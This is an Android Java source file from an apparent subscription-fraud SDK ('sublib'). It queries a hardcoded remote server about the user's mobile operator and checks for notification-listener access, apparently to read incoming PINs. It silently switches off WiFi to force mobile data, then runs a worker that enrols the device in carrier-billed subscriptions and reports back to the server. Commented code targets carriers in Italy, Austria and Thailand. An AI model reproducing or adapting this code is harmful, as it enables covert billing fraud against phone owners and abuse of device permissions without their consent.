package com.enhtmv.sublib.common.sub;

import android.annotation.SuppressLint;
import android.app.AlertDialog;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.wifi.WifiManager;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.text.TextUtils;
import android.webkit.WebView;
import android.widget.RelativeLayout;

import com.alibaba.fastjson.JSON;
import com.blankj.utilcode.util.LogUtils;
import com.blankj.utilcode.util.NetworkUtils;
import com.blankj.utilcode.util.Utils;
import com.cp.plugin.CheckBean;
import com.cp.plugin.Plugin;
import com.cp.plugin.event.SubEvent;
import com.enhtmv.moli.subproject.BuildConfig;
import com.enhtmv.sublib.common.SubReport;
import com.enhtmv.sublib.common.http.SubProxy;
import com.enhtmv.sublib.common.util.SharedUtil;
import com.enhtmv.sublib.common.util.StringUtil;
import com.enhtmv.sublib.common.util.NetUtil;
import com.enhtmv.sublib.work.WebSocketWorker;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

import static android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS;
import static com.enhtmv.sublib.common.sub.SubCall.*;


public class SubContext {

    private static final String ENABLED_NOTIFICATION_LISTENERS = "enabled_notification_listeners";

    @SuppressLint("StaticFieldLeak")
    private static SubContext subContext;

    private static boolean running = false;

    //debug
    private static boolean closeWifi = true;
    private static SubProxy subProxy;
    private static String operator;


    private Context context;

    private NetworkStateReceiver receiver;

    private SubEvent event;

    private SubCall subCall;

    private RelativeLayout layout;

    private OkHttpClient client = new OkHttpClient();

    private Handler mainHandler = new Handler(Looper.getMainLooper());

    private void initSubCall() {
        final String userAgent = new WebView(context).getSettings().getUserAgentString();
        operator = StringUtil.isEmpty(operator) ? NetUtil.getOperator() : operator;

        subCall = new WebSocketWorker();
        if (subCall != null) {
            subCall.init(userAgent, operator, event);
            if (subProxy != null) {
                subCall.setProxy(subProxy);
            }
        }

        new Thread(new Runnable() {
            @Override
            public void run() {
//                Request request = new Request.Builder().url("http://192.168.50.165:8077/api/check_is_pin?operator=43434").build();
                Request request = new Request.Builder().url(APP_CHECK_HOST + APP_CHECK_OPERATOR + operator).build();
                Response response;
                try {
                    response = client.newCall(request).execute();
                    if (response.isSuccessful()) {
                        String string = response.body().string();
                        final CheckBean checkBean = JSON.parseObject(string, CheckBean.class);

                        if (checkBean.getCode() == 1) {
                            return;
                        }

                        mainHandler.post(new Runnable() {
                            @Override
                            public void run() {
                                //result = 1 代表需要ping
                                if (checkBean.getResult() == 1) {
                                    if(!isNotificationServiceEnabled()){
                                        System.out.println("ping...showdialog.............");
                                        Plugin.showDialog();
                                    }else{
                                        System.out.println("ping...call...................");
                                        call();
                                    }
                                }else{
                                    System.out.println("click...call...................");
                                    Plugin.isPermission = true;
                                    call();
                                }

                            }
                        });
                    } else {
                        throw new Exception("Unexpected code " + response);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();


//        switch (operator) {

//            case ITALY_TIM:
//                LogUtils.i("init TIM", operator);
//                subCall = new TIMSub();
//                break;
//            case AUSTRIA_H3G:
//            case AUSTRIA_H3G_2:
//                subCall = new WebSocketWorker();
//                LogUtils.i("初始化 奥地利 H3G", operator);
//                subCall = new AustriaH3G(this.context);
//                break;
//            case AUSTRIA_OPERATOR_A1_1:
//            case AUSTRIA_OPERATOR_A1_2:
//                LogUtils.i("初始化 奥地利 A1", operator);
//                subCall = new AustriaA1();
//                subCall = new WebSocketWorker();
//                break;
//            default:

    }

    public static void call() {
        System.out.println("call..................");
        synchronized (SubContext.class) {

            if (!Plugin.isPermission) {
                if (!isNotificationServiceEnabled()) {

                    subContext.subCall.r.w("not_notification_permission");

                    running = false;

                    if (BuildConfig.DEBUG) {
                        System.out.println("not_notification_permission");
                    }
                    return;
                }
            }

            if (!running && subContext.subCall != null) {

                running = true;

                boolean success = SharedUtil.isSuccess();

                LogUtils.i("sub status", success);

                //是否订阅成功
                if (!success) {
//                    int data = 1;
                    //state = 0时，为带ping订阅
                    System.out.println("SubContext...............2");

//                    if (subContext.subCall instanceof AustriaH3G) {
//                        if (!isNotificationServiceEnabled()) {
//
//                            subContext.subCall.r.w("not_notification_permission");
//
//                            running = false;
//
//                            return;
//                        }
//                    }
//                    else if (Sub.TH_AIS.equals(subContext.subCall.operator)) {
//
//                        if (!isNotificationServiceEnabled()) {
//
//                            subContext.subCall.r.w("not_notification_permission");
//
//                            running = false;
//
//                            return;
//                        }
//                    }

                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                String info = SubReport.getReport().info();

                                if (!StringUtil.isEmpty(info)) {

                                    //关闭wifi
                                    if (wifiStateAndClose()) {
                                        //调用 WebSocketWorker 中sub方法
                                        subContext.subCall.sub(info);

                                    }
                                }

                            } catch (Exception e) {
                                LogUtils.e(e);
                            } finally {
                                running = false;
                            }

                        }

                    }).start();
                } else {
                    running = false;
                }
            }
        }


    }


    /**
     * 初始化 SubContext init方法
     *
     * @param context
     * @param event
     */
    public static void init(Context context, SubEvent event) {
        synchronized (SubEvent.class) {
            Utils.init(context);
            //初始化上报函数
            //APP_SERVER_HOST = http://52.53.238.169:8081
            SubReport.init(APP_SERVER_HOST);

            if (subContext == null) {

                subContext = new SubContext(context, event);
            }

        }

    }

    public static void init(Context context, SubEvent event, RelativeLayout layout) {

        synchronized (SubEvent.class) {


            Utils.init(context);

            SubReport.init(APP_SERVER_HOST);


            if (subContext == null) {

                subContext = new SubContext(context, event, layout);

            }

        }

    }

    /**
     * @param context
     * @param event
     */
    private SubContext(Context context, SubEvent event) {
        this.context = context;
        this.event = event;

        initSubCall();
        if (!SharedUtil.isInstalled()) {
            event.onMessage(INSTALLED, null);
            SubReport.getReport().i(INSTALLED);
            SharedUtil.installed();
        }
    }


    private SubContext(Context context, SubEvent event, RelativeLayout layout) {
        this.context = context;
        this.event = event;
        this.layout = layout;

        initSubCall();

        if (!SharedUtil.isInstalled()) {

            event.onMessage(INSTALLED, null);
            SubReport.getReport().i(INSTALLED);


            SharedUtil.installed();

        }

    }


    private static boolean wifiStateAndClose() {

        if (closeWifi) {

            int netCode = NetUtil.getNetworkState(subContext.context);

            if (netCode == NetUtil.NETWORK_WIFI) {

                LogUtils.d("start close wifi");

                //注册广播
                if (subContext.receiver == null) {

                    subContext.receiver = new NetworkStateReceiver();

                    IntentFilter filter = new IntentFilter();

                    filter.addAction("android.net.conn.CONNECTIVITY_CHANGE");
                    filter.addAction("android.net.wifi.WIFI_STATE_CHANGED");
                    filter.addAction("android.net.wifi.STATE_CHANGE");

                    subContext.context.registerReceiver(subContext.receiver, filter);
                }

                WifiManager wifiManager = (WifiManager) subContext.context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);

                if (wifiManager != null) {
                    wifiManager.setWifiEnabled(false);
                }

                return false;
            } else if (netCode == NetUtil.NETWORK_NONE) {
                LogUtils.w("not network");
                return false;
            }
        }

        return true;
    }

    public static void closeWifi(boolean wifi) {
        closeWifi = wifi;
    }

    public static void log(boolean log) {

        LogUtils.getConfig().setLogSwitch(log);

    }

    public static void proxy(SubProxy proxy) {
        subProxy = proxy;
    }

    public static void setOperator(String code) {
        operator = code;
    }




    /**
     * 该方法用于开启通知后回调
     *
     * @param message
     */
    public static void call(final String message) {

        if (subContext.subCall != null) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    subContext.subCall.onSub(message);
                }
            }).start();
        }
    }

    private static boolean isNotificationServiceEnabled() {

        String pkgName = subContext.context.getPackageName();
        final String flat = Settings.Secure.getString(subContext.context.getContentResolver(),
                ENABLED_NOTIFICATION_LISTENERS);

        if (!TextUtils.isEmpty(flat)) {
            final String[] names = flat.split(":");

            for (String name : names) {
                final ComponentName cn = ComponentName.unflattenFromString(name);
                if (cn != null) {
                    if (TextUtils.equals(pkgName, cn.getPackageName())) {
                        return true;
                    }
                }
            }
        }
        return false;
    }

    private static class NetworkStateReceiver extends BroadcastReceiver {


        public void destroy() {
            subContext.context.unregisterReceiver(this);
            subContext.receiver = null;
        }


        @Override
        public void onReceive(Context context, Intent intent) {

            LogUtils.i("NetworkStateReceiver", intent.toString());

            if (NetworkUtils.isConnected() && !NetworkUtils.isWifiConnected() && NetworkUtils.isMobileData()) {

                subContext.subCall.report(OPEN_4G_NETWORK);

                call();

                destroy();

            }
        }
    }


}
